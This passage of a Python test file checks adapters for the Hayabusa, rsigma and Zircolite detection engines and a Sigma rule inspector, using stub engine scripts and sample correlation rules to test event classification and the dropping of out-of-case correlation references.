        event_id="evt_unknown_999",
        physical_record_id="pr-unk-1",
        source_type="custom_unmapped",
        fields={"msg": "opaque"},
        parse_metadata={},
    )
    assert classify_event_format(unknown_ev) == "unknown"

    rules_dir = tmp_path / "rules"
    (rules_dir / "config").mkdir(parents=True)
    (rules_dir / "config" / "channel_eid_info.txt").write_text("Sysmon\n", encoding="utf-8")

    obs_file = tmp_path / "haya_mixed_in.json"
    haya_bin = _write_exe_script(
        tmp_path / "haya_mixed.py",
        f"""
import json, sys
from pathlib import Path
args = sys.argv[1:]
if args == ["--version"]:
    print("Hayabusa v4.5.0")
    sys.exit(0)
in_file = Path(args[args.index("-f") + 1])
out_file = Path(args[args.index("-o") + 1])
rows = [json.loads(line) for line in in_file.read_text().splitlines() if line.strip()]
Path({str(obs_file)!r}).write_text(json.dumps([r.get("event_id") for r in rows]), encoding="utf-8")
out_file.write_text(json.dumps({{
    "Timestamp": "2026-01-15T10:00:05.000000Z",
    "RuleTitle": "Haya Mixed Batch Hit",
    "RuleID": "h-mixed-1",
    "Level": "high",
    "Computer": "HOST1.corp.local",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "EventID": 1,
    "RecordID": 101,
    "MitreTactics": ["Exec"],
    "MitreTags": ["T1059.001"],
}}) + "\\n")
""",
    )

    out = HayabusaAdapter().run(
        _make_ctx(),
        [win_ev, unknown_ev],
        EngineConfig(bin_path=haya_bin, rules_dir=rules_dir),
        ruleset_version="v1",
    )
    assert json.loads(obs_file.read_text(encoding="utf-8")) == ["evt_win_001"]
    assert len(out.hits) == 1
    assert out.hits[0].event_ids == ["evt_win_001"]
    assert out.coverage[0].status == "ran"

    # Unknown-only batch must skip cleanly without raising InvalidArgumentError
    unk_only_out = HayabusaAdapter().run(
        _make_ctx(),
        [unknown_ev],
        EngineConfig(bin_path=haya_bin, rules_dir=rules_dir),
        ruleset_version="v1",
    )
    assert unk_only_out.hits == []
    assert len(unk_only_out.coverage) == 1
    assert unk_only_out.coverage[0].status == "skipped"
    assert unk_only_out.coverage[0].reason == "no_compatible_events"


def test_out_of_case_correlation_refs_dropped_for_rsigma_and_zircolite(tmp_path: Path) -> None:
    events = _sample_six_format_events()[:2]  # evt_win_001 (10:00:05Z), evt_zeek_002 (10:00:01Z)
    rules_dir = tmp_path / "rules"
    rules_dir.mkdir()

    rsigma_bin = _write_exe_script(
        tmp_path / "rsigma_ooc.py",
        """
import json, sys
from pathlib import Path
args = sys.argv[1:]
if args == ["--version"]:
    print("rsigma 0.28.0")
    sys.exit(0)
out_file = Path(args[args.index("-o") + 1])
rows = [
    {
        "rule_title": "OOC Events Corr",
        "rule_id": "r-corr-ooc-events",
        "level": "high",
        "tags": ["attack.discovery"],
        "correlation_type": "temporal",
        "aggregated_value": 2.0,
        "events": [{"event_id": "evt_outside_case_1"}, {"event_id": "evt_outside_case_2"}],
    },
    {
        "rule_title": "OOC EventIDs Corr",
        "rule_id": "r-corr-ooc-eids",
        "level": "high",
        "tags": ["attack.discovery"],
        "correlation_type": "event_count",
        "aggregated_value": 2.0,
        "event_ids": ["evt_outside_case_3"],
    },
    {
        "rule_title": "OOC Unresolvable Line Number Corr",
        "rule_id": "r-corr-ooc-line",
        "level": "high",
        "tags": ["attack.discovery"],
        "correlation_type": "event_count",
        "aggregated_value": 1.0,
        "events": [{"Computer": "HOST_UNKNOWN", "line_number": 99999}],
    },
    {
        "rule_title": "OOC Events Lacking EventID Corr",
        "rule_id": "r-corr-ooc-no-eid",
        "level": "high",
        "tags": ["attack.discovery"],
        "correlation_type": "event_count",
        "aggregated_value": 1.0,
        "events": [{"@timestamp": "2026-01-15T10:00:05Z"}],
    },
    {
        "rule_title": "Valid Line Number Corr",
        "rule_id": "r-corr-valid-line",
        "level": "high",
        "tags": ["attack.execution"],
        "correlation_type": "event_count",
        "aggregated_value": 1.0,
        "events": [{"Computer": "HOST1.corp.local", "line_number": 2}],
    },
    {
        "rule_title": "Genuine Count Only Corr",
        "rule_id": "r-corr-real-count-only",
        "level": "medium",
        "tags": ["attack.discovery"],
        "correlation_type": "event_count",
        "aggregated_value": 4.0,
    },
    {
        "rule_title": "Genuine Empty Events Count Only Corr",
        "rule_id": "r-corr-empty-events-count-only",
        "level": "medium",
        "tags": ["attack.discovery"],
        "correlation_type": "event_count",
        "aggregated_value": 3.0,
        "events": [],
    },
]
out_file.write_text("\\n".join(json.dumps(x) for x in rows) + "\\n")
""",
    )
    r_out = RSigmaAdapter().run(
        _make_ctx(),
        events,
        EngineConfig(bin_path=rsigma_bin, rules_dir=rules_dir),
        ruleset_version="v1",
    )
    assert [h.rule_id for h in r_out.hits] == [
        "r-corr-valid-line",
        "r-corr-real-count-only",
        "r-corr-empty-events-count-only",
    ]
    assert r_out.hits[0].is_lead_only is False
    assert r_out.hits[0].event_ids == ["evt_win_001"]
    assert all(h.is_lead_only is True and h.event_ids == [] for h in r_out.hits[1:])
    assert [lead["rule_id"] for lead in r_out.leads] == [
        "r-corr-real-count-only",
        "r-corr-empty-events-count-only",
    ]

    zirc_bin = _write_exe_script(
        tmp_path / "zirc_ooc.py",
        """
import json, sys
from pathlib import Path
args = sys.argv[1:]
if args == ["--version"]:
    print("Zircolite v4.8.0")
    sys.exit(0)
out_file = Path(args[args.index("-o") + 1])
out_file.write_text(json.dumps([
    {
        "title": "Zirc OOC Corr",
        "id": "z-corr-ooc",
        "rule_level": "high",
        "tags": ["attack.lateral-movement"],
        "result_type": "correlation",
        "event_count": 2,
        "matches": [
            {
                "result_type": "correlation",
                "alert_id": "a1",
                "evidence": [
                    {"event_id": "0:1", "event": {"row_id": 1, "event_id": "evt_outside_case_1"}},
                ],
            }
        ],
    },
    {
        "title": "Zirc Unresolvable Evidence RowID",
        "id": "z-corr-ooc-rowid",
        "rule_level": "high",
        "tags": ["attack.lateral-movement"],
        "result_type": "correlation",
        "event_count": 1,
        "matches": [
            {
                "result_type": "correlation",
                "alert_id": "a1b",
                "evidence": [{"event": {"row_id": 99999}}],
            }
        ],
    },
    {
        "title": "Zirc Unresolvable Evidence RowID With Key",
        "id": "z-corr-ooc-rowid-key",
        "rule_level": "high",
        "tags": ["attack.lateral-movement"],
        "result_type": "correlation",
        "event_count": 1,
        "matches": [
            {
                "result_type": "correlation",
                "alert_id": "a1c",
                "evidence": [{"event_id": "0:999", "event": {"row_id": 999}}],
            }
        ],
    },
    {
        "title": "Zirc Unresolvable Match Event RowID",
        "id": "z-corr-ooc-match-event",
        "rule_level": "high",
        "tags": ["attack.lateral-movement"],
        "result_type": "correlation",
        "event_count": 1,
        "matches": [
            {
                "result_type": "correlation",
                "alert_id": "a1d",
                "event": {"row_id": 99999},
            }
        ],
    },
    {
        "title": "Zirc OOC EventIDs",
        "id": "z-corr-ooc-event-ids",
        "rule_level": "high",
        "tags": ["attack.lateral-movement"],
        "result_type": "correlation",
        "event_count": 1,
        "matches": [
            {
                "result_type": "correlation",
                "alert_id": "a1e",
                "event_ids": ["evt_out_of_case"],
            }
        ],
    },
    {
        "title": "Zirc Valid Match Event RowID",
        "id": "z-corr-valid-match-event",
        "rule_level": "high",
        "tags": ["attack.execution"],
        "result_type": "correlation",
        "event_count": 1,
        "matches": [
            {
                "result_type": "correlation",
                "alert_id": "a1f",
                "event": {"row_id": 1},
            }
        ],
    },
    {
        "title": "Zirc Genuine Count Only Corr",
        "id": "z-corr-count-only",
        "rule_level": "medium",
        "tags": ["attack.discovery"],
        "result_type": "correlation",
        "event_count": 3,
        "matches": [
            {
                "result_type": "correlation",
                "alert_id": "a2",
            }
        ],
    },
    {
        "title": "Zirc Empty Evidence Count Only Corr",
        "id": "z-corr-empty-evidence-count-only",
        "rule_level": "medium",
        "tags": ["attack.discovery"],
        "result_type": "correlation",
        "event_count": 2,
        "matches": [
            {
                "result_type": "correlation",
                "alert_id": "a3",
                "evidence": [],
                "event": {},
                "event_ids": [],
            }
        ],
    },
]))
""",
    )
    z_out = ZircoliteAdapter().run(
        _make_ctx(),
        events,
        EngineConfig(bin_path=zirc_bin, rules_dir=rules_dir),
        ruleset_version="v1",
    )
    assert [h.rule_id for h in z_out.hits] == [
        "z-corr-valid-match-event",
        "z-corr-count-only",
        "z-corr-empty-evidence-count-only",
    ]
    assert z_out.hits[0].is_lead_only is False
    assert z_out.hits[0].event_ids == ["evt_win_001"]
    assert all(h.is_lead_only is True and h.event_ids == [] for h in z_out.hits[1:])
    assert [lead["rule_id"] for lead in z_out.leads] == [
        "z-corr-count-only",
        "z-corr-empty-evidence-count-only",
    ]


def test_inspect_sigma_rules_chained_correlation_fallback_order_independent(tmp_path: Path) -> None:
    rules_dir = tmp_path / "chained_sigma"
    rules_dir.mkdir()

    # Dependent correlation sorts alphabetically BEFORE its target correlation and base rule
    (rules_dir / "00_corr_b.yml").write_text(
        """
title: Chained Correlation B
id: bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb
name: corr_b
date: 2026-01-14
correlation:
  type: event_count
  rules:
    - corr_a
  group-by:
    - User
  timespan: 10m
  condition:
    gte: 2
level: high
tags:
  - attack.lateral_movement
""",
        encoding="utf-8",
    )
    (rules_dir / "01_broken_corr.yml").write_text(
        """
title: Unrelated Broken Correlation
id: dddddddd-dddd-dddd-dddd-dddddddddddd
date: 2026-01-14
correlation:
  type: event_count
  rules:
    - does_not_exist_rule
  group-by:
    - User
  timespan: 5m
  condition:
    gte: 2
level: medium
""",
        encoding="utf-8",
    )
    (rules_dir / "mm_base.yml").write_text(
        """
title: Base Windows Rule
id: aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
name: mm_base
status: test
date: 2026-01-10
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    CommandLine|contains: powershell
  condition: selection
level: high
tags:
  - attack.execution
""",
        encoding="utf-8",
    )
    (rules_dir / "zz_corr_a.yml").write_text(
        """
title: Chained Correlation A
id: cccccccc-cccc-cccc-cccc-cccccccccccc
name: corr_a
date: 2026-01-12
correlation:
  type: event_count
  rules:
    - mm_base
  group-by:
    - User
  timespan: 5m
  condition:
    gte: 2
level: high
tags:
  - attack.execution
""",
        encoding="utf-8",
    )
    (rules_dir / "99_malformed.yml").write_text(
        "title: Malformed\ndetection:\n  selection: [\n",
        encoding="utf-8",
    )

    cov = inspect_sigma_rules(
        rules_dir,
        batch_formats={"winxml"},
        ruleset_version="v1",
    )
    by_id = {r.rule_id: r for r in cov}
    assert by_id["aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa"].status == "ran"
    assert by_id["cccccccc-cccc-cccc-cccc-cccccccccccc"].status == "ran"
    assert by_id["bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb"].status == "ran"
    assert by_id["dddddddd-dddd-dddd-dddd-dddddddddddd"].status == "failed"
    assert "correlation_ref_error" in (
        by_id["dddddddd-dddd-dddd-dddd-dddddddddddd"].reason or ""
    )
    assert by_id["99_malformed"].status == "failed"
